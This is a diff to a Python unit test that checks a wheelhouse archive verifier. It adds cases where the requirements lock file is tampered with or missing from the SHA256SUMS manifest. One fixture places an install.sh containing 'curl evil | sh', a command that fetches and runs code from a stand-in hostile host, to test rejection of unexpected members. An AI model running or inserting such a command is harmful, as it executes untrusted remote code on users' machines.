@@ -563,13 +563,16 @@ class Wheelhouse(unittest.TestCase):
     def tearDown(self):
         shutil.rmtree(self.tmp, ignore_errors=True)
 
-    def house(self, name: str, *, wheels: dict, sums: dict | None = None, extra: list | None = None) -> Path:
+    def house(self, name: str, *, wheels: dict, sums: dict | None = None, extra: list | None = None,
+              requirements: bytes = b"a==1.0 --hash=sha256:00\n", omit_requirements=False) -> Path:
         box = self.tmp / name
         box.mkdir()
         listed = wheels if sums is None else sums
         text = "".join(f"{sha(data)}  wheels/{w}\n" for w, data in sorted(listed.items())).encode()
+        if not omit_requirements:
+            text += (sha(b"a==1.0 --hash=sha256:00\n") + '  requirements.lock.txt\n').encode()
         members = [(f"wheels/{w}", data) for w, data in sorted(wheels.items())]
-        members += [("SHA256SUMS", text), ("requirements.lock.txt", b"a==1.0 --hash=sha256:00\n")] + (extra or [])
+        members += [("SHA256SUMS", text), ("requirements.lock.txt", requirements)] + (extra or [])
         make_tar(box / "wheelhouse.tar", members)
         return box
 
@@ -583,6 +586,8 @@ class Wheelhouse(unittest.TestCase):
         self.assertEqual(proc.stdout.strip(), sha(sums))
         self.assertTrue((box / "wheelhouse" / "wheels" / "alpha-1.0-py3-none-any.whl").is_file())
         bad_cases = {
+            "changed_requirements": dict(wheels=wheels, requirements=b"tampered\n"),
+            "unlisted_requirements": dict(wheels=wheels, omit_requirements=True),
             "changed_wheel": dict(wheels={**wheels, "alpha-1.0-py3-none-any.whl": b"tampered"}, sums=wheels),
             "unlisted_wheel": dict(wheels={**wheels, "gamma-1.0-py3-none-any.whl": b"g"}, sums=wheels),
             "unexpected_member": dict(wheels=wheels, extra=[("install.sh", b"curl evil | sh")]),
